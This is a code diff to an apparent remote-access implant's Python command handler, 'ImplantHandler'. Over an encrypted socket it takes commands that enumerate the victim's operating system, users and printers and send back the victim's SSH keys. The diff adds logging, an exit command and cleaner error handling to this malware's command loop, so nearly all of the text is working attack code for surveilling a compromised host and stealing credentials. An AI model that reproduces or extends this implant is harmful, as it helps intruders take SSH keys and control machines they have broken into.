@@ -20,7 +20,7 @@ class ImplantHandler(SocketServer.BaseRequestHandler):
     def setup(self):
         self.logger.debug('setup')
         return SocketServer.BaseRequestHandler.setup(self)
-
+    
     def handle(self):
         from constants import BUFFER_SIZE
         self.logger.debug('handle')
@@ -30,8 +30,10 @@ class ImplantHandler(SocketServer.BaseRequestHandler):
         
         while True:
             try:
+                self.logger.debug("waiting for cmd")
                 cmd = cipher.decode(self.request.recv(BUFFER_SIZE)).strip()
-                 
+                self.logger.debug("received cmd-->" + cmd)
+                
                 if cmd == "enum_os":
                     self.request.sendall(cipher.encode(victim.enum_os()))
                 elif cmd == "enum_users":
@@ -44,11 +46,15 @@ class ImplantHandler(SocketServer.BaseRequestHandler):
                     self.request.sendall(cipher.encode(victim.enum_printers()))
                 elif cmd == "get_ssh_keys":
                     self.request.sendall(cipher.encode(victim.get_ssh_keys()))
-            except: 
-                self.server.close_request(self.request) #remove this?
-                sys.exit(1)
+                elif cmd == "exit":
+                    break
+                else:
+                    self.request.sendall(cipher.encode("[!] Unknown command\n"))
+            except Exception as e:
+                self.logger.debug(e)
+                break
         return
-
+    
     def finish(self):
         self.logger.debug('finish')
         return SocketServer.BaseRequestHandler.finish(self)
